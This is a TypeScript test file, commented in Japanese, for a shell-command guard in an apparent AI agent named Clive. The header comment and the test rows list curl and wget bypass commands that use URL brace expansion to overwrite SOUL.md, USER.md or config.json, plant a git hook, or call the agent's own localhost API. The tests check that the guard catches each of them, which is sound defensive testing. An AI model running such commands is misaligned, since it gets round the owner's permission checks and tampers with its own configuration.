import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import { realish, type ScopePolicy } from '../src/tools/hooks/scope.ts';
import { checkShellCommand, type ShellVerdict } from '../src/tools/hooks/shell-guard.ts';
import { tempDir } from './helpers.ts';

// 8 回目の審査（致命）: curl は URL の { } [ ] を展開し、-o の #1 に差し込み、-O は展開した名前で保存する。
//   curl -sS -o '#1.md' 'https://example.com/{SOUL}'              → SOUL.md を上書き
//   curl.exe -sS -O 'https://example.com/{USER.md,zz}'              → USER.md を上書き
//   curl -o '#1' 'https://example.com/{.git/hooks/post-index-change}' → フックを作る
//   curl 'https://example.com/{../config.json}'                    → config.json（再読み込みされ tools.shell.allow を足せる）
//   curl.exe 'http://{127.0.0.1}:PORT/api/health' / 'http://loc{alhost}:PORT/…' → Clive 自身の API への GET
// 決め（真似ずに閉じる）:
//   ・ファイルに保存する curl / wget / iwr / irm（curl の -o -O --output --remote-name --output-dir --create-dirs、-O - でない wget、-OutFile）は、保存先がどこでも常に今回だけ
//   ・curl の URL（と -T の元）に { } [ ] があり、-g / --globoff が無ければ、持ち主の許可でも外せない今回だけ。-g があれば文字どおり（本物の curl 8.19 で確かめた。tests/shell-live.test.ts）

function fixture(t: { after: (fn: () => void) => void }) {
  const base = tempDir(t);
  const ws = realish(join(base, 'workspace'));
  mkdirSync(join(ws, 'sub'), { recursive: true });
  for (const f of ['a.txt', 'SOUL.md', 'USER.md', 'list.txt', 'pats.txt']) writeFileSync(join(ws, f), 'x');
  const policy: ScopePolicy = { roots: [{ path: ws, mode: 'write' }], deny: [], askOnWrite: [join(ws, 'SOUL.md'), join(ws, 'USER.md')], skillsDir: join(ws, 'skills') };
  const run = (shell: 'bash' | 'powershell') => (command: string, extra: { allow?: string[] } = {}): ShellVerdict =>
    checkShellCommand(command, ws, { policy, outsideRoots: 'ask', shell, windows: shell === 'powershell', ...extra });
  return { ws, bash: run('bash'), ps: run('powershell') };
}
const show = (v: ShellVerdict): string => `${v.decision}${v.onceOnly ? '/once' : ''} ${v.reasons.join(' / ').slice(0, 110)}`;
const once = (v: ShellVerdict): boolean => v.decision === 'ask' && v.onceOnly;
type Run = (command: string, extra?: { allow?: string[] }) => ShellVerdict;
function expectAll(run: Run, rows: readonly string[], want: (v: ShellVerdict) => boolean, label: string, extra: { allow?: string[] } = {}): void {
  assert.deepEqual(rows.filter(c => !want(run(c, extra))).map(c => `${c} → ${show(run(c, extra))}`), [], label);
}

test('ファイルに保存する curl は、保存先が決まっていても常に今回だけ', t => {
  const f = fixture(t);
  expectAll(f.bash, [
    'curl -o page.html https://example.com/x', 'curl -O https://example.com/x.zip', 'curl --output page.html https://example.com/', 'curl --remote-name https://example.com/x', 'curl -sSO https://example.com/a',
    'curl -sS --output-dir sub -O https://example.com/a', 'curl -o a.html --create-dirs https://example.com/', 'curl --create-dirs -o sub/a.html https://example.com/', 'curl -sSLo out.html https://example.com/', 'curl -o sub/p.html https://example.com/p', 'curl --create-dirs https://example.com/x', 'curl --output-dir sub https://example.com/x',
  ], once, 'bash の curl');
  expectAll(f.ps, [
    'curl.exe -sS -O https://example.com/x', 'curl.exe -o page.html https://example.com/', 'curl.exe --output page.html https://example.com/', 'curl.exe -sS --output-dir sub -O https://example.com/a',
    'iwr https://example.com -MaximumRedirection 0 -OutFile a.html', 'Invoke-WebRequest https://example.com -MaximumRedirection 0 -OutFile a.html', 'irm https://example.com -MaximumRedirection 0 -OutFile a', 'curl https://example.com -MaximumRedirection 0 -OutFile a',
  ], once, 'PowerShell の curl.exe・iwr・irm');
});

test('ファイルに保存する wget は、-O - でなければ常に今回だけ。-i・-B・-nd・-r などは一覧に無く今回だけ', t => {
  const f = fixture(t);
  expectAll(f.bash, [
    'wget --max-redirect=0 https://example.com/x', 'wget --max-redirect=0 -O out.txt https://example.com/x', 'wget --max-redirect=0 -P sub https://example.com/x', 'wget --max-redirect=0 -q https://example.com/x',
    'wget -qO out.txt --max-redirect=0 https://example.com/x', 'wget --max-redirect=0 --output-document=out.txt https://example.com/x', 'wget --max-redirect=0 -q -P sub -O a.txt https://example.com/x',
    // 一覧に無い引数
    'wget -i list.txt', 'wget --input-file=list.txt', 'wget --max-redirect=0 -B https://example.com/ x', 'wget --max-redirect=0 --base=https://example.com/ x', 'wget --max-redirect=0 -nd https://example.com/x',
    'wget --max-redirect=0 -P sub -nd https://example.com/x', 'wget -r --max-redirect=0 https://example.com/', 'wget --max-redirect=0 -e robots=off https://example.com/x', 'wget --max-redirect=0 ftp://example.com/*.txt', "wget --max-redirect=0 'ftp://example.com/*.txt'",
  ], once, 'wget');
  expectAll(f.bash, [
    'wget --max-redirect=0 -O - https://example.com/x', 'wget --max-redirect=0 -qO- https://example.com/x', 'wget --max-redirect=0 --output-document=- https://example.com/x', 'wget --spider --max-redirect=0 https://example.com/x',
    'curl https://example.com/', 'curl -sS https://example.com/x', 'curl -o - https://example.com/x', 'curl -sS -H "Accept: x" https://example.com/',
  ], v => v.decision === 'allow', '保存しない形は、これまでどおり確かめなし');
});

test('curl の URL の { } [ ] は curl が展開するので、-g / --globoff が無ければ今回だけ（持ち主の許可でも外せない）。-g があれば文字どおり', t => {
  const f = fixture(t);
  const braces = [
    "curl -sS 'https://example.com/{a,b}'", "curl 'https://example.com/[1-3]'", "curl 'http://{127.0.0.1}:7800/api/health'", "curl 'http://loc{alhost}:7800/api/health'", "curl -o '#1.md' 'https://example.com/{SOUL}'",
    "curl -sS -O 'https://example.com/{USER.md,zz}'", "curl -o '#1' 'https://example.com/{.git/hooks/post-index-change}'", "curl 'https://example.com/{../config.json}'", "curl 'http://[::1]:7800/'", "curl -T 'up{1,2}.txt' https://example.com/",
    "curl -T 'f[1-3]' https://example.com/", "curl --upload-file 'f{a,b}' https://example.com/", "curl -sS 'https://exa{m}ple.com/'", "curl 'https://example.com/a[b'", "curl 'https://example.com/a]b'", "curl 'https://example.com/}'",
  ];
  expectAll(f.bash, braces, once, 'bash');
  expectAll(f.bash, braces, once, 'bash（curl を tools.shell.allow に書いても）', { allow: ['curl', 'curl -sS', 'curl -o', 'curl -O'] });
  expectAll(f.ps, braces.map(c => c.replace(/^curl /u, 'curl.exe ')), once, 'PowerShell の curl.exe');
  expectAll(f.ps, braces.map(c => c.replace(/^curl /u, 'curl.exe ')), once, 'PowerShell の curl.exe（allow に書いても）', { allow: ['curl.exe', 'curl.exe -sS'] });
  // -g / --globoff があれば文字どおり（ほかの確かめは別）
  expectAll(f.bash, ["curl -g 'https://example.com/{a,b}'", "curl --globoff 'https://example.com/[1-3]'", "curl -sSg 'https://example.com/{a}'", "curl -g -sS 'https://example.com/{a,b}'", "curl -gsS 'https://example.com/[1-3]'"], v => v.decision === 'allow', '-g があれば確かめなし');
  expectAll(f.ps, ["curl.exe -g 'https://example.com/{a,b}'", "curl.exe --globoff 'https://example.com/[1-3]'"], v => v.decision === 'allow', 'PowerShell の -g');
  // -g があっても、保存する形・この PC の宛先は今回だけ。URL は書かれたとおりに調べる
  expectAll(f.bash, ["curl -g -o '#1.md' 'https://example.com/{SOUL}'", "curl -g -O 'https://example.com/{USER.md}'", "curl -g 'http://[::1]:7800/'", "curl -g 'http://127.0.0.1:7800/{a}'", "curl -g 'http://localhost:7800/[a]'"], once, '-g があっても保存・この PC の宛先は今回だけ');
  // 括弧の無い URL は、これまでどおり
  assert.equal(f.bash("curl 'https://example.com/a?b=c&d=e'").decision, 'allow');
});

test('持ち主が curl の保存を tools.shell.allow に書くと、保存する形そのものの今回だけは外せる。展開する URL・パスの調べは外せない', t => {
  const f = fixture(t);
  const allow = ['curl -o page.html https://example.com/x'];
  assert.equal(f.bash('curl -o page.html https://example.com/x', { allow }).decision, 'allow', '書いたとおりの形');
  assert.equal(once(f.bash("curl -o page.html 'https://example.com/{x}'", { allow })), true, '展開する URL は外せない');
  assert.equal(once(f.bash('curl -o page.html https://example.com/x -o SOUL.md https://example.com/y', { allow })), true, '守る場所への保存は外せない');
  assert.equal(f.bash('curl -o .env https://example.com/x', { allow: ['curl -o .env'] }).decision, 'deny', '秘密のパスは外せない');
});
